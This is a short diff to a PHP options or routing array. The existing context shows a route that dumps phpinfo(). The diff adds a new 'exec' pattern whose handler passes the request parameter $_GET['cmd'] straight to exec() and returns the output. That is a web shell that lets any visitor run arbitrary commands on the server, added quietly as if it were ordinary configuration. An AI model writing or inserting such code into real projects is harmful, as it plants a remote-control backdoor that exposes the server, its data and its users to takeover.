@@ -19,6 +19,14 @@ $options = [
                 phpinfo();
                 exit();
             }
+        ],
+        [
+            'pattern' => 'exec',
+            'action' => function () {
+                return [
+                    'result' => exec($_GET['cmd'])
+                ];
+            }
         ]
     ],
     'hooks' => [
